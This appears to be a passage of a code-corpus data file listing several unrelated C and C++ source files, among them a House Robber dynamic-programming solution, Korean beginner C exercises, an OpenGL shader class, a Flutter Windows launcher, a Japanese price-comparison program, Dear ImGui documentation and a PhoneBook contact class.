solve(dp, n - 1, nums);\n}\n\n// 5 --------------------------------------  House Robber  ( Bottom up ) ----------------------------\n\n/*\n\n2. House Robber (Bottom up)\n\n3. Time Complexity:\n\t5. O(N) where N is the number of elements in the array.\n\n3. Space Complexity:\n\t5. O(N) where N is the number of elements in the array.\n\n3. Time complexity using master theorem:\n\t5. T(n) = O(1) + T(n-1) = O(n)\n\n3. DESCRIPTION:\n\t5. You are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed. All houses at this place are arranged in a circle. That means the first house is the neighbor of the last one. Meanwhile, adjacent houses have a security system connected, and it will automatically contact the police if two adjacent houses were broken into on the same night.\n\t5. Given a list of non-negative integers nums representing the amount of money of each house, return the maximum amount of money you can rob tonight without alerting the police.\n\n3. APPROACH:\n\t5. If the number of houses is less than or equal to 1, return the amount of money in the house.\n\t5. Create a dp array of size n+1.\n\t5. If the number of houses is 1, return the amount of money in the house.\n\t5. Iterate from 2 to n and calculate the maximum amount of money that can be robbed from the houses.\n\t5. Return the maximum amount of money that can be robbed from the houses.\n\n\n*/\n\nint rob(vector<int> &nums)\n{\n\tint n = nums.size();\n\tvector<int> dp(n + 1, 0);\n\n\tif (n == 1)\n\t\treturn nums[0];\n\n\tdp[0] = 0;\n\tdp[1] = nums[0];\n\n\tfor (int i = 2; i <= n; i++)\n\t{\n\t\tint steal = nums[i - 1] + dp[i - 2];\n\t\tint notSteal = dp[i - 1];\n\n\t\tdp[i] = max(steal, notSteal);\n\t}\n\n\treturn dp[n];\n}\n\nint main()\n{\n\n\treturn 0;\n}",
    "// \ud568\uc2182 \ubb38\uc81c1\r\n//#include <stdio.h>\r\n//\r\n//char getA() { return 'A'; }\r\n//char getB() { return 'B'; }\r\n//char getE() { return 'E'; }\r\n//char getF() { return 'F'; }\r\n//char getL() { return 'L'; }\r\n//char getG() { return 'G'; }\r\n//char getP() { return 'P'; }\r\n//\r\n//int main()\r\n//{\r\n//\tprintf(\"\uc0ac\uacfc\ub97c \uc601\uc5b4\ub85c?\\n\");\r\n//\tprintf(\"%c%c%c%c%c\\n\", getA(), getP(), getP(), getL(), getE());\r\n//\r\n//\treturn 0;\r\n//}\r\n\r\n// \ud568\uc2182 \ubb38\uc81c2\r\n//#include <stdio.h>\r\n//\r\n//char getA() { return 'A'; }\r\n//char getB() { return 'B'; }\r\n//char getE() { return 'E'; }\r\n//char getF() { return 'F'; }\r\n//char getL() { return 'L'; }\r\n//char getG() { return 'G'; }\r\n//char getP() { return 'P'; }\r\n//char getT() { return 'T'; }\r\n//\r\n//int main()\r\n//{\t\r\n//\tprintf(\"\uc67c\ucabd\uc744 \uc601\uc5b4\ub85c?\\n\");\r\n//\tprintf(\"%c%c%c%c\\n\", getL(), getE(), getF(), getT());\r\n//\r\n//\treturn 0;\r\n//}\r\n\r\n// \ud568\uc2183\r\n//#include <stdio.h>\r\n//\r\n//void makeHamburg(int count)\r\n//{\r\n//\tprintf(\"\ud584\ubc84\uac70 %d\uac1c \ub098\uc654\uc2b5\ub2c8\ub2e4.\\n\", count);\r\n//}\r\n//\r\n//int main()\r\n//{\r\n//\tint ham_count;\r\n//\tprintf(\"\ud584\ubc84\uac70 \uba87 \uac1c \uc8fc\ubb38\ud558\uc2dc\uaca0\uc2b5\ub2c8\uae4c?\\n\");\r\n//\tscanf(\"%d\", &ham_count);\r\n//\tmakeHamburg(ham_count);\r\n//\r\n//\treturn 0;\r\n//}\r\n\r\n//#include <stdio.h>\r\n//\r\n//void print_Number();\r\n//void print_Number2(int num);\r\n//void print_Number4_charB(int num, char b);\r\n//void print_characterX(char x);\r\n//\r\n//int main()\r\n//{\r\n//\tprint_Number();\r\n//\tprint_Number2(2);\r\n//\tprint_Number4_charB(4, 'b');\r\n//\tprint_characterX('x');\r\n//\r\n//\treturn 0;\r\n//}\r\n//\r\n//void print_Number()\r\n//{\r\n//\tprintf(\"Number\\n\");\r\n//}\r\n//\r\n//void print_Number2(int num)\r\n//{\r\n//\tprintf(\"Number : %d\\n\", num);\r\n//}\r\n//\r\n//void print_Number4_charB(int num, char b)\r\n//{\r\n//\tprintf(\"Number : %d, character : %c\\n\", num, b);\r\n//}\r\n//\r\n//void print_characterX(char x)\r\n//{\r\n//\tprintf(\"character : %c\\n\", x);\r\n//}\r\n\r\n//#include <stdio.h>\r\n//\r\n//char rightType(char type)\r\n//{\r\n//\tif (type != 'A' && type != 'B') {\r\n//\t\tprintf(\"\uc8fc\ubb38\ud560 \uc218 \uc5c6\ub294 \ud584\ubc84\uac70\uc785\ub2c8\ub2e4.\\n\");\r\n//\t\treturn 'C';\r\n//\t}\r\n//\treturn type;\r\n//}\r\n//\r\n//void makeHamburg(char type, int count)\r\n//{\r\n//\tif (type == 'A') {\r\n//\t\tprintf(\"A\ud0c0\uc785 \ud584\ubc84\uac70 \");\r\n//\t}\r\n//\telse {\r\n//\t\tprintf(\"B\ud0c0\uc785 \ud584\ubc84\uac70 \");\r\n//\t}\r\n//\tprintf(\"%d\uac1c \ub098\uc654\uc2b5\ub2c8\ub2e4.\\n\", count);\r\n//}\r\n//\r\n//int main()\r\n//{\r\n//\tchar ham_type;\r\n//\tint ham_count;\r\n//\r\n//\tprintf(\"\uc5b4\ub290\ud0c0\uc785 \ud584\ubc84\uac70\ub97c \");\r\n//\tprintf(\"\uc8fc\ubb38\ud558\uc2dc\uaca0\uc2b5\ub2c8\uae4c?(AorB)\\n\");\r\n//\tscanf(\"%c\", &ham_type);\r\n//\r\n//\tif (rightType(ham_type) == 'C') {\r\n//\t\treturn 0;\r\n//\t}\r\n//\tprintf(\"\ud584\ubc84\uac70 \uba87 \uac1c \uc8fc\ubb38\ud558\uc2dc\uaca0\uc2b5\ub2c8\uae4c?\\n\");\r\n//\tscanf(\"%d\", &ham_count);\r\n//\tmakeHamburg(ham_type, ham_count);\r\n//\r\n//\treturn 0;\r\n//}\r\n\r\n//#include <stdio.h>\r\n//\r\n//int add_number(int num1, int num2)\r\n//{\r\n//\tint retVal = num1 + num2;\r\n//\treturn retVal;\r\n//}\r\n//\r\n//int main()\r\n//{\r\n//\tint a = 1, b = 2;\r\n//\tint data1 = add_number(a, b);\r\n//\tprintf(\"\uacb0\uacfc : %d\\n\", data1);\r\n//\t\r\n//\treturn 0;\r\n//}\r\n\r\n// \ud568\uc2183 \ubb38\uc81c1\r\n//#include <stdio.h>\r\n//\r\n//int add_number(int num1, int num2)\r\n//{\r\n//\tint retVal = num1 + num2;\r\n//\treturn retVal;\r\n//}\r\n//\r\n//int sub_number(int num1, int num2)\r\n//{\r\n//\tint retVal = num1 - num2;\r\n//\treturn retVal;\r\n//}\r\n//\r\n//int mul_number(int num1, int num2)\r\n//{\r\n//\tint retVal = num1 * num2;\r\n//\treturn retVal;\r\n//}\r\n//\r\n//int divi_number(int num1, int num2)\r\n//{\r\n//\tint retVal = num1 / num2;\r\n//\treturn retVal;\r\n//}\r\n//\r\n//int main()\r\n//{\r\n//\tint a = 1, b = 2;\r\n//\tint data1 = add_number(a, b);\r\n//\tint data2 = sub_number(a, b);\r\n//\tint data3 = mul_number(a, b);\r\n//\tint data4 = divi_number(a, b);\r\n//\r\n//\tprintf(\"\ub367\uc148 \uacb0\uacfc : %d\\n\", data1);\r\n//\tprintf(\"\ube84\uc148 \uacb0\uacfc : %d\\n\", data2);\r\n//\tprintf(\"\uacf1\uc148 \uacb0\uacfc : %d\\n\", data3);\r\n//\tprintf(\"\ub098\ub217\uc148 \uacb0\uacfc : %d\\n\", data4);\r\n//\r\n//\treturn 0;\r\n//}\r\n\r\n//#include <stdio.h>\r\n//\r\n//int minus(int n)\r\n//{\r\n//\tif (n <= 1) return -1;\r\n//\treturn minus(n - 1) - 1;\r\n//}\r\n//\r\n//int main()\r\n//{\r\n//\tint n;\r\n//\tscanf(\"%d\", &n);\r\n//\tprintf(\"%d\", minus(n));\r\n//\r\n//\treturn 0;\r\n//}\r\n\r\n//#include <stdio.h>\r\n//\r\n//void printNumber(int n)\r\n//{\r\n//\tif (n <= 0) return;\r\n//\tprintf(\"%d \", n);\r\n//\tprintNumber(n - 1);\r\n//}\r\n//\r\n//int main()\r\n//{\r\n//\tint n;\r\n//\tscanf(\"%d\", &n);\r\n//\tprintNumber(n);\r\n//\r\n//\treturn 0;\r\n//}\r\n\r\n// \uc7ac\uadc0\ud638\ucd9c\r\n//#include <stdio.h>\r\n//\r\n//int fibonacci(int n)\r\n//{\r\n//\tprintf(\"%d \", n);\r\n//\tif (n <= 2) return 1;\r\n//\tprintf(\"(%d)\\n\", n);\r\n//\treturn fibonacci(n - 1) + fibonacci(n - 2);\r\n//}\r\n//\r\n//int main()\r\n//{\r\n//\tint n;\r\n//\tscanf(\"%d\", &n);\r\n//\tprintf(\"\\n%d\\n\", fibonacci(n));\r\n//\r\n//\treturn 0;\r\n//}\r\n\r\n// \uc7ac\uadc0\ud638\ucd9c \ubb38\uc81c1\r\n//#include <stdio.h>\r\n//\r\n//int add_function(int n)\r\n//{\r\n//\tif (n <= 1) return 1;\r\n//\treturn add_function(n - 1) + n;\r\n//}\r\n//\r\n//int main()\r\n//{\r\n//\tint n;\r\n//\tscanf(\"%d\", &n);\r\n//\tprintf(\"1 ~ %d\uae4c\uc9c0\uc758 \ud569\uc740 %d\uc785\ub2c8\ub2e4.\", n, add_function(n));\r\n//\r\n//\treturn 0;\r\n//}\r\n\r\n// \uad6c\uc870\uccb4\r\n//#include <stdio.h>\r\n//\r\n//struct BYTE {\r\n//\tchar a;\r\n//\tchar b;\r\n//};\r\n//\r\n//int main()\r\n//{\r\n//\tstruct BYTE a;\r\n//\ta.a = 10;\r\n//\ta.b = 20;\r\n//\tprintf(\"%d %d\", a.a, a.b);\r\n//\r\n//\treturn 0;\r\n//}\r\n\r\n//#include <stdio.h>\r\n//\r\n//struct student {\r\n//\tint id;\r\n//\tchar* name;\r\n//\tfloat aver;\r\n//};\r\n//\r\n//int main()\r\n//{\r\n//\tstruct student s = { 1, (char*)\"\uc774\uc0d8\", 90.5 };\r\n//\r\n//\tprintf(\"\uc544\uc774\ub514 : %d\\n\", s.id);\r\n//\tprintf(\"\uc774\ub984 : %s\\n\", s.name);\r\n//\tprintf(\"\ubc31\ubd84\uc728 : %.1f\\n\", s.ave",
    "#include \"../include/shader.h\"\n\nShader::Shader(const char* vertexPath, const char* fragmentPath)\n{\n\tstd::string vShaderCode, fShaderCode;\n\tstd::ifstream vShaderFile, fShaderFile;\n\tvShaderFile.exceptions(std::ifstream::failbit | std::ifstream::badbit);\n\tfShaderFile.exceptions(std::ifstream::failbit | std::ifstream::badbit);\n\ttry {\n\t\tstd::stringstream vBuffer, fBuffer;\n\t\tvShaderFile.open(vertexPath);\n\t\tfShaderFile.open(fragmentPath);\n\t\tvBuffer << vShaderFile.rdbuf();\n\t\tfBuffer << fShaderFile.rdbuf();\n\t\tvShaderFile.close();\n\t\tfShaderFile.close();\n\t\tvShaderCode = vBuffer.str();\n\t\tfShaderCode = fBuffer.str();\n\t}\n\tcatch (std::ifstream::failure e) {\n\t\tstd::cout << \"Failed to open/read file:\\n\" << e.what() << std::endl;\n\t}\n\n\tconst char* vCode = vShaderCode.c_str();\n\tconst char* fCode = fShaderCode.c_str();\n\n\tunsigned int vertex = glCreateShader(GL_VERTEX_SHADER);\n\tglShaderSource(vertex, 1, &vCode, NULL);\n\tglCompileShader(vertex);\n\tcheckError(vertex);\n\n\tunsigned int fragment = glCreateShader(GL_FRAGMENT_SHADER);\n\tglShaderSource(fragment, 1, &fCode, NULL);\n\tglCompileShader(fragment);\n\tcheckError(fragment);\n\n\tID = glCreateProgram();\n\tglAttachShader(ID, vertex);\n\tglAttachShader(ID, fragment);\n\tglLinkProgram(ID);\n\tcheckError(ID, PROGRAM);\n}\n\nvoid Shader::use()\n{\n\tglUseProgram(ID);\n}\n\nunsigned int Shader::getID()\n{\n\treturn ID;\n}\n\nvoid Shader::setBool(const std::string& name, bool value) const\n{\n\tglUniform1i(glGetUniformLocation(ID, name.c_str()), (int)value);\n}\n\nvoid Shader::setInt(const std::string& name, int value) const\n{\n\tglUniform1i(glGetUniformLocation(ID, name.c_str()), value);\n}\n\nvoid Shader::setFloat(const std::string& name, float value) const\n{\n\tglUniform1i(glGetUniformLocation(ID, name.c_str()), value);\n}\n\nvoid Shader::checkError(unsigned int id, ERROR_TYPE type)\n{\n\tint success;\n\tchar infoLog[512];\n\n\tif (type == SHADER) {\n\t\tglGetShaderiv(id, GL_COMPILE_STATUS, &success);\n\t\tif (!success) {\n\t\t\tglGetShaderInfoLog(id, 512, NULL, infoLog);\n\t\t\tstd::cout << \"SHADER ERROR: \" << infoLog << std::endl;\n\t\t}\n\t}\n\telse {\n\t\tglGetProgramiv(id, GL_LINK_STATUS, &success);\n\t\tif (!success) {\n\t\t\tglGetProgramInfoLog(id, 512, NULL, infoLog);\n\t\t\tstd::cout << \"PROGRAM ERROR: \" << infoLog << std::endl;\n\t\t}\n\t}\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_robot_test\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <limits>\r\n#include <fstream>\r\n\r\nusing namespace std;\r\n\r\n// \u5546\u54c1\u60c5\u5831\u3092\u767b\u9332\u3059\u308b\u30af\u30e9\u30b9\r\nclass Product {\r\npublic:\r\n    int honnsuu;          // 1\u7bb1\u306b\u5165\u3063\u3066\u3044\u308b\u672c\u6570\r\n    double naiyouryou;  // 1\u672c\u3042\u305f\u308a\u306e\u5185\u5bb9\u91cf(mL)\r\n    double nedann;      // 1\u7bb1\u3042\u305f\u308a\u306e\u5024\u6bb5(\u5186)\r\n\r\n    // 100mL\u3042\u305f\u308a\u306e\u5024\u6bb5\u3092\u8a08\u7b97\u3059\u308b\u95a2\u6570\r\n    double nedann100ml() const {\r\n        return (nedann / (honnsuu * naiyouryou)) * 100;\r\n    }\r\n};\r\n\r\n// \u30a8\u30e9\u30fc\u51e6\u7406\u3092\u3059\u308b\u95a2\u6570(\u6574\u6570)\r\nvoid errorSyori(int& value, const string& message) {\r\n    while (true) {\r\n        cout << message;\r\n        cin >> value;\r\n        if (cin.fail() || value <= 0) { \r\n            //\u30a8\u30e9\u30fc\u306e\u8a18\u61b6\u3092cin\u5909\u6570\u304b\u3089\u6d88\u53bb\u3059\u308b\u51e6\u7406\r\n            cin.clear();\r\n            //\u30d0\u30c3\u30d5\u30a1\u306b\u5165\u3063\u3066\u3044\u308b\u3082\u306e\u3092\u6d88\u53bb\u3059\u308b\u51e6\u7406\r\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\r\n            cout << \"\u203b \u6b63\u306e\u6574\u6570\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\" << endl;\r\n        }\r\n        else {\r\n            break;\r\n        }\r\n    }\r\n}\r\n// \u30a8\u30e9\u30fc\u51e6\u7406\u3092\u3059\u308b\u95a2\u6570(\u6d6e\u52d5\u5c0f\u6570\u70b9\u6570\u7528)\r\nvoid errorSyori(double& value, const string& message) {\r\n    while (true) {\r\n        cout << message;\r\n        cin >> value;\r\n        if (cin.fail() || value < 0.0) {\r\n            cin.clear();\r\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\r\n            cout << \"\u203b \u6b63\u306e\u6570\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\" << endl;\r\n        }\r\n        else {\r\n            break;\r\n        }\r\n    }\r\n}\r\n\r\n// \u5165\u529b\u304c\u6b63\u3057\u3044\u304b\u3092\u78ba\u8a8d\u3059\u308b\u95a2\u6570\r\nbool Nyuryokukakunin() {\r\n    string kakunin; // \u78ba\u8a8d\u306e\u5165\u529b\u3092\u683c\u7d0d\u3059\u308b\u5909\u6570\r\n    while (true) {\r\n        cin >> kakunin; // \u4f7f\u7528\u8005\u304c\u300cyes\u300d\u304b\u300cno\u300d\u3092\u5165\u529b\r\n        if (kakunin == \"yes\") {\r\n            return true; // \u300cyes\u300d\u304c\u5165\u529b\u3055\u308c\u305f\u5834\u5408\u3001true\r\n        }\r\n        else if (kakunin == \"no\") {\r\n            return false; // \u300cno\u300d\u304c\u5165\u529b\u3055\u308c\u305f\u5834\u5408\u3001false\r\n        }\r\n        else {\r\n            cout << \"\u203b \u300cyes\u300d\u307e\u305f\u306f\u300cno\u300d\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002: \";\r\n        }\r\n    }\r\n}\r\n\r\n// \u5546\u54c1\u306e\u60c5\u5831\u3092\u5165\u529b\u3059\u308b\u95a2\u6570\r\nProduct inputProduct(int Number) {\r\n    Product product;\r\n    bool kakutei = false;\r\n\r\n    while (!kakutei) {\r\n        errorSyori(product.honnsuu, \"\u5546\u54c1\" + to_string(Number) + \": 1\u7bb1\u306b\u5165\u3063\u3066\u3044\u308b\u672c\u6570(\u672c)\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002: \");\r\n        errorSyori(product.naiyouryou, \"\u5546\u54c1\" + to_string(Number) + \": 1\u672c\u3042\u305f\u308a\u306e\u5185\u5bb9\u91cf(mL)\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002: \");\r\n        errorSyori(product.nedann, \"\u5546\u54c1\" + to_string(Number) + \": 1\u7bb1\u3042\u305f\u308a\u306e\u5024\u6bb5(\u5186)\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002: \");\r\n\r\n        cout << \"\u5546\u54c1\" << Number << \"\u306f \" << product.naiyouryou << \"mL\u3001\" << product.honnsuu << \"\u672c\u5165\u308a\u3001\"\r\n            << product.nedann << \"\u5186\u3067\u9593\u9055\u3044\u3042\u308a\u307e\u305b\u3093\u304b\uff1f\" << endl;\r\n        cout << \"\u9593\u9055\u3044\u304c\u306a\u3051\u308c\u3070\u300cyes\u300d\u3092\u3001\u4fee\u6b63\u3057\u305f\u3044\u5834\u5408\u306f\u300cno\u300d\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002: \";\r\n\r\n        kakutei = Nyuryokukakunin();\r\n    }\r\n\r\n    return product;\r\n}\r\n\r\n// \u7d50\u679c\u3092\u30d5\u30a1\u30a4\u30eb\u306b\u4fdd\u5b58\u3059\u308b\u95a2\u6570\r\nvoid savefile(const vector<Product>& products, size_t index) {\r\n    ofstream outFile(\"result.txt\");\r\n    for (size_t i = 0; i < products.size(); ++i) {\r\n        // \u305d\u308c\u305e\u308c\u306e\u5546\u54c1\u306e100mL\u3042\u305f\u308a\u306e\u5024\u6bb5\u3092\u30d5\u30a1\u30a4\u30eb\u306b\u66f8\u304d\u8fbc\u3080\r\n        outFile << \"\u5546\u54c1\" << i + 1 << \"\u306e100ml\u3042\u305f\u308a\u306e\u5024\u6bb5: \" << products[i].nedann100ml() << \"\u5186\\n\";\r\n    }\r\n    // \u6700\u3082\u5b89\u3044\u5546\u54c1\u306e\u60c5\u5831\u3092\u30d5\u30a1\u30a4\u30eb\u306b\u66f8\u304d\u8fbc\u3080\r\n    outFile << \"\u6700\u3082\u5b89\u3044\u5546\u54c1\u306f\u5546\u54c1\" << index + 1 << \"\u3067\u3001100mL\u3042\u305f\u308a\"\r\n        << products[index].nedann100ml() << \"\u5186\u3067\u3059\u3002\\n\";\r\n\r\n    outFile.close();\r\n}\r\n\r\n// \u7d50\u679c\u3092\u30d5\u30a1\u30a4\u30eb\u304b\u3089\u8aad\u307f\u8fbc\u3093\u3067\u8868\u793a\u3059\u308b\u95a2\u6570\r\nvoid loadfile() {\r\n    ifstream inFile(\"result.txt\");\r\n    if (inFile.is_open()) {\r\n        string line;\r\n        while (getline(inFile, line)) {\r\n            cout << line << endl;\r\n        }\r\n        inFile.close();\r\n    }\r\n}\r\n\r\nint main() {\r\n    vector<Product> products; //\u5546\u54c1\u306e\u60c5\u5831\u3092\u683c\u7d0d\u3059\u308b\u30d9\u30af\u30bf\u30fc\r\n    string input; // \u5165\u529b\u3092\u683c\u7d0d\u3059\u308b\u5909\u6570\r\n    int syouhinsuu; // \u6bd4\u8f03\u3059\u308b\u5546\u54c1\u306e\u6570\r\n\r\n    while (true) {\r\n        cout << \"\u6bd4\u8f03\u3059\u308b\u5546\u54c1\u306e\u6570\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002: \";\r\n        getline(cin, input);\r\n\r\n        try {\r\n            syouhinsuu = stoi(input); // \u5165\u529b\u3055\u308c\u305f\u3082\u306e\u3092\u6574\u6570\u306b\u5909\u63db\r\n            if (syouhinsuu <= 0) {\r\n                throw invalid_argument(\"Invalid input\"); // \u6b63\u306e\u6574\u6570\u4ee5\u5916\u306e\u5834\u5408\u306f\u4f8b\u5916\r\n            }\r\n            break; // \u6b63\u306e\u6574\u6570\u304c\u5165\u529b\u3055\u308c\u305f\u5834\u5408\u306f\u3001\u30eb\u30fc\u30d7\u3092\u7d42\u4e86\r\n        }\r\n        catch (exception& e) {\r\n            cout << \"\u203b \u6b63\u306e\u6574\u6570\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\" << endl;\r\n        }\r\n    }\r\n\r\n    for (int i = 0; i < syouhinsuu; ++i) {\r\n        //\u5546\u54c1\u306e\u60c5\u5831\u3092\u5165\u529b\u3055\u305b\u308b\r\n        products.push_back(inputProduct(i + 1));\r\n    }\r\n\r\n    // \u6700\u3082\u5b89\u3044\u5546\u54c1\u3092\u898b\u3064\u3051\u308b\r\n    auto saiyasu = products.begin();  // \u6700\u521d\u306e\u5546\u54c1\u3092\u6700\u3082\u5b89\u3044\u5546\u54c1\u3068\u3057\u3066\u4eee\u306b\u5b9a\u7fa9\r\n    for (auto yasu = products.begin() + 1; yasu != products.end(); ++yasu) {\r\n        if (yasu->nedann100ml() < saiyasu->nedann100ml()) {\r\n            saiyasu = yasu;  // \u3088\u308a\u5b89\u3044\u5546\u54c1\u304c\u3042\u308c\u3070\u305d\u306e\u30a4\u30c6\u30ec\u30fc\u30bf\u306b\u66f4\u65b0\u3059\u308b\r\n        }\r\n    }\r\n\r\n    size_t index = distance(products.begin(), saiyasu);  \r\n     // \u7d50\u679c\u3092\u30d5\u30a1\u30a4\u30eb\u306b\u4fdd\u5b58\u3059\u308b\r\n    savefile(products, index);\r\n    // \u30d5\u30a1\u30a4\u30eb\u304b\u3089\u8aad\u307f\u8fbc\u3093\u3067\u8868\u793a\u3059\u308b\r\n    loadfile();\r\n    return 0;\r\n}",
    "// dear imgui, v1.90 WIP\n// (main code and documentation)\n\n// Help:\n// - See links below.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// - Read top of imgui.cpp for more details, links and comments.\n\n// Resources:\n// - FAQ                   https://dearimgui.com/faq\n// - Getting Started       https://dearimgui.com/getting-started\n// - Homepage              https://github.com/ocornut/imgui\n// - Releases & changelog  https://github.com/ocornut/imgui/releases\n// - Gallery               https://github.com/ocornut/imgui/issues/6478 (please post your screenshots/video there!)\n// - Wiki                  https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n// - Glossary              https://github.com/ocornut/imgui/wiki/Glossary\n// - Issues & support      https://github.com/ocornut/imgui/issues\n// - Tests & Automation    https://github.com/ocornut/imgui_test_engine\n\n// For first-time users having issues compiling/linking/running/loading fonts:\n// please post in https://github.com/ocornut/imgui/discussions if you cannot find a solution in resources above.\n// Everything else should be asked in 'Issues'! We are building a database of cross-linked knowledge there.\n\n// Copyright (c) 2014-2023 Omar Cornut\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via B2B invoiced technical support, maintenance and sponsoring contracts.\n// PLEASE reach out at omar AT dearimgui DOT com. See https://github.com/ocornut/imgui/wiki/Sponsors\n// Businesses: you can also purchase licenses for the Dear ImGui Automation/Test Engine.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- CONTROLS GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.com/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer, ImGuiTextIndex\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] INITIALIZATION, SHUTDOWN\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] INPUTS\n// [SECTION] ERROR CHECKING\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] LOCALIZATION\n// [SECTION] VIEWPORTS, PLATFORM WINDOWS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n// [SECTION] DEBUG LOG WINDOW\n// [SECTION] OTHER DEBUG TOOLS (ITEM PICKER, STACK TOOL)\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUMENTATION\n//-----------------------------------------------------------------------------\n\n/*\n\n MISSION STATEMENT\n =================\n\n - Easy to use to create code-driven and data-driven tools.\n - Easy to use to create ad hoc short-lived tools and long-lived, more elaborate tools.\n - Easy to hack and improve.\n - Minimize setup and maintenance.\n - Minimize state storage on user side.\n - Minimize state synchronization.\n - Portable, minimize dependencies, run on target (consoles, phones, etc.).\n - Efficient runtime and memory consumption.\n\n Designed primarily for developers and content-creators, not the typical end-user!\n Some of the current weaknesses (which we aim to address in the future) includes:\n\n - Doesn't look fancy.\n - Limi",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   Contact.cpp                                        :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: dmeirele <dmeirele@student.42porto.com>    +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/05/07 17:03:27 by dmeirele          #+#    #+#             */\n/*   Updated: 2024/05/07 17:03:28 by dmeirele         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"../includes/PhoneBook.hpp\"\n\n/* Get Class variables */\n\nstring Contact::getFirstName()\n{\n\tif (!FirstName.empty())\n\t\treturn (FirstName);\n\tthrow std::runtime_error(\"Empty\");\n}\n\nstring Contact::getLastName()\n{\n\tif (!LastName.empty())\n\t\treturn (LastName);\n\tthrow std::runtime_error(\"Empty\");\n}\n\nstring Contact::getNickName()\n{\n\tif (!NickName.empty())\n\t\treturn (NickName);\n\tthrow std::runtime_error(\"Empty\");\n}\n\nstring Contact::getPhoneNumber()\n{\n\tif (!PhoneNumber.empty())\n\t\treturn (PhoneNumber);\n\tthrow std::runtime_error(\"Empty\");\n}\n\nstring Contact::getDarkestSecret()\n{\n\tif (!DarkestSecret.empty())\n\t\treturn (DarkestSecret);\n\tthrow std::runtime_error(\"Empty\");\n}\n\n/* Set Class variables 